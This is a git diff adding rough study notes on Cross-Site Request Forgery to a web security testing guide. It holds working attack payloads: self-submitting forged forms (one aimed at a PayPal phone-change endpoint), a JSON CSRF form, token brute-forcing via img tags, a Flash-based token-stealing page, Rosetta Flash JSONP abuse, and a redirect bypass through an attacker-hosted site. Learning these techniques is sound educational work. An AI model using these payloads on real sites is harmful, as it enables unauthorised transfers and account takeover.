@@ -387,40 +387,251 @@ https://github.com/OWASP/wstg/tree/master, security test guide
 
 
 # Cross-Site Request Forgery
+- introducing CSRF. The following URL is generated for the same:
+
+https://bank.example.com/transfer/money?username=John&amount=500
+
+<img src="https://bank.example.com/transfer/money?username=Attacker&amount=2500"/>
+
+
+GET /buy.php?symbol=SCOX&shares=1000HTTP/1.1
+HOST:stocks.example.org 
+
+a POST request in the hope of fixing this, but sadly this is one of the worst ideas ever because CSRF vulnerability exists in POST requests as well.
+
+without the user becoming aware of anything
+
+- self submitting form hosted by an attacker 
+
+```
+<html>
+  <head>
+  </head>
+  <body onload=document.getElementById('xsrf').submit()>
+    <form id='xsrf' method="post" action=" https://bank.example.com/transfer/money">
+      <input type='hidden' name='username' value='John'>
+      </input>
+      <input type='hidden' name='amount' value='500'>
+      </input>
+    </form>
+</body>
+</html>
+```
+
+- how developers prevent CSRF 
+
+server assign session with a unique anti-CSRF token 
+
+https://bank.example.com/transfer/money?username=John&amount=500&token=ABC123
+
+an anti-CSRF token with the name fb_dtsg and the value AQHP05SkQmqT as follows
+
+fakebook also have anti-CSRF token too, named fb_dtsg 
+
+- paypals's CSRF vunerability to change phone numbers, it don't have anit-CSRF token 
+
+Send Code a one-time password was received on my number, and looking at my account settings page I saw the number was changed to the newer one which I requested the code for
+
+
+```
+<html>
+  <head>
+  </head>
+  <body onload=document.getElementById('xsrf').submit()>
+    <form id='xsrf' method="post" action="https://www.paypal.com/webapps/customerprofile/phone/confirm">
+      <input type='hidden' name='formAction' value='edit'>
+      </input>
+      <input type='hidden' name='actionId' value='doAction'>
+      </input>
+      <input type='hidden' name='phoneType' value='MOBILE'>
+      </input>
+      <input type='hidden' name='countryCode' value='IN'>
+      </input>
+      <input type='hidden' name='phoneNumber' value='9431194311'>
+      </input>
+      <input type='hidden' name='phoneHasErrors' value='true'>
+      </input>
+      <input type='hidden' name='sendCode' value='true'>
+      </input>
+    </form>
+  </body>
+</html>
+```
+
+- exploiting CSRF in JSON request 
+
+A JSON-based POST data looks like the following
+
+```
+<html>
+  <head>
+  </head>
+  <body onload=document.getElementById('xsrf').submit()>
+    <form id="xsrf" action=" https://bank.example.com/transfer/money" method=post enctype="text/plain" >
+      <input name='{"username":"Attacker","amount":2500, "padding":"' value='garbage"}' type='hidden'>
+    </form>
+  </body>
+</html>
+```
+- using XSS still anti-CSRF token 
+
+var csrf = document.getElementsByTagName("input")['fb_dtsg'].value;
+alert('Your CSRF protection token fb_dtsg has value '+csrf);
+
+- exploring pseduo anti-CSRF tokens, while testing an application, we should always try to remove the CSRF token parameter/header from the request and check whether the server accepts or rejects the request altogether
+
+    + If currently logged in as user A then use the CSRF token of any other user B and check if the request of A is allowed via B's token
+
+    use this by bypass the CSRF 
+    
+    + Don't delete the anti-CSRF token parameter but put a blank inside its value and see if it works
+    
+    + Put a random string with a similar length to that of the anti-CSRF token. Check to see if that works.
+
+    + Check if the CSRF token is common to all users. If so, then use the token to construct an exploit.
+
+    + example, if CSRF tokens are only numbers in the range 1-100 or 1-1000 or similar variations
+
+    we can create a exploit 
+    
+```
+<html>
+  <head></head>
+  <body>
+    <img src="https://bank.example.com/transfer/money?username=Attacker&amount=2500&token=1"/>
+
+    <img src="https://bank.example.com/transfer/money?username=Attacker&amount=2500&token=2"/>
+
+    <img src="https://bank.example.com/transfer/money?username=Attacker&amount=2500&token=3"/>
+
+    <img src="https://bank.example.com/transfer/money?username=Attacker&amount=2500&token=4"/>
+
+    <img src="https://bank.example.com/transfer/money?username=Attacker&amount=2500&token=5"/>
+    …
+    <img src="https://bank.example.com/transfer/money?username=Attacker&amount=2500&token=100"/>
+  </body>
+</html>
+```
+
+- upload Flash or SWF files with benign extensions like .jpg, .gif, or .png and it will be happily accepted by the server backend
+
+the Flash file and pass the HTML output from the Flash file to a JavaScript callback function to perform source parsing. The page in which the Flash is embedded can be hosted anywhere, but once the Flash file is executed, it will simply send a request to the affected site and grab the HTML source which will contain the anti-CSRF tokens.
+
+    1. uploads an SWF into the affected site which allows file uploading in the form of images
+    
+    2. The attacker creates a page on his website and embeds the SWF which was hosted on the vulnerable website.
+
+    3. gives the victim user the link to this embedded CSRF exploit. to navigate to the page 
+    
+    4. The victim is logged in and opens up the link, and silently the Flash file makes a request to the vulnerable website and downloads the HTML with the anti-CSRF token
+
+```
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<html>
+  <head>
+    <title>Bug</title>
+  </head>
+  <body>
+    <script type="text/javascript">
+      var x ;
+      function nice(x)
+      {
+        x = unescape(x);
+
+        var id = x.split("form_build_id\" value=\"")[1].split("\"")[0];
+
+        var token =  x.split("form_token\" value=\"")[1].split("\"")[0]; 
+
+        document.getElementsByName("form_build_id")[0].value = id;
+        document.getElementsByName("form_token")[0].value = token;
+        console.log(document.getElementById("csrf").submit());
+      }
+    </script>
+    <object style="width:1px;height:1px" data="https://staging.example.com/sites/default/files/magic.jpg" type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="callback=nice&url=https://staging.example.com/ ">
+    </object>
+
+    <embed src="" allowscript="always" flashvars>
+    </embed>
+
+    <form id = "csrf" action="https://staging.example.com/messages/new" method="POST">
+     <input type="hidden" name="recipient" value="admin" />
+     <input type="hidden" name="subject" value="meassages" />
+     <input type="hidden" name="body[value]" value="DemoHAX :)" />
+     <input type="hidden" name="form_build_id" value="" />
+     <input type="hidden" name="form_token" value="" />
+     <input type="hidden" name="form_id" value="privatemsg_new" />
+      <input type="hidden" name="op" value="Send message" />
+     <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
+    + to fix this 
+    
+    Content-Disposition: attachment; filename="magic.jpg"
+
+    + We can also leverage JSONP endpoints to percent encode our Flash file as a callback name, which will reflect back into the output of the endpoint
+
+    <object style="width:1px;height:1px" data="https://staging.example.com/jsonp/api?callback=[percent-encoded-flash-file] " type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="callback=nice&url=https://staging.example.com/ ">
+    </object>
+
+    use a tool called Rosetta Flash, which will be discussed in the next section
+
+    Google Security Engineer called Michele Spagnuolo. This tool uses Huffman encoding to map non-alphanumeric characters (binary) in a Flash file to their alphanumeric alternatives
+
+    The end result of this is that a binary Flash file is converted totally into an alphanumeric Flash file. This can be utilized to create alphanumeric SWF and then put it inside the callback name of the JSONP endpoints. 
+
+    ```
+    CWSMIKI0hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7...
+    ```
+
+    load with jsonp 
+    ```
+    <object style="width:1px;height:1px" data="https://staging.example.com/jsonp/api?callback=CWSMIKI0hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7siudIbEAtwwuttsGGDt0swDt0GDtDDGDDwtwpDDtDwwDDwwGwGDwGDDGDGDDDGGDDDGwGDDG0GDtDDDtDtptpDDt333wwwv3swwFPeHBGHHWCHjhHfRTHHHwJoxHHH….." type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="callback=nice&url=https://staging.example.com/ ">
+    </object>
+    ```
+
+    Rosetta Flash can be downloaded from https://github.com/mikispag/rosettaflash
+
+- The majority of web applications use XMLHTTPRequest (AJAX) to communicate with the web backend and these requests are susceptible to CSRF vulnerability.
+
+AJAX call there's a header attached, known as X-Requested-With; this somewhat acts like a CSRF protection as it is assumed that custom (user created) headers cannot be added into the browser requests
+
+X-Requested-With opens the door to CSRF flaws. 
+
+    1. The attacker discovers an endpoint (and the request) using POST-based AJAX calls and utilizing only the X-Requested-With header to protect from CSRF
+
+    2. The attacker creates an SWF file which sends a CSRF request (with X-Requested-With) to his own website's endpoint, let's assume it's https://attacker.example.com/redirect.php.
+    
+    3. Now the redirect.php file issues a 307 HTTP redirect status to the vulnerable endpoint of the target site. This tricks Flash into sending the CSRF POST request to the target site with the header, resulting in the bypass
+
+    a crossdomain.xml policy is hosted on the attacker's website 
+    ```
+    <?xml version="1.0" encoding="UTF-8"?>
+    <cross-domain-policy>
+      <allow-access-from domain="*"/>
+      <allow-http-request-headers-from domain="*" headers="*"/>
+    </cross-domain-policy>
+    ```
+    Flash requires this policy to be present before sending any request
+    
+    
+# SQL injection 
 - 
+    
+# File upload vulnerability
 
+# Metasploit and web 
 
+# XML attacks 
 
+# Emerging attack vectors 
 
+# OAuth 2.0 security 
 
+# API testing methodology 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+# Summary 
+    
+    
+    
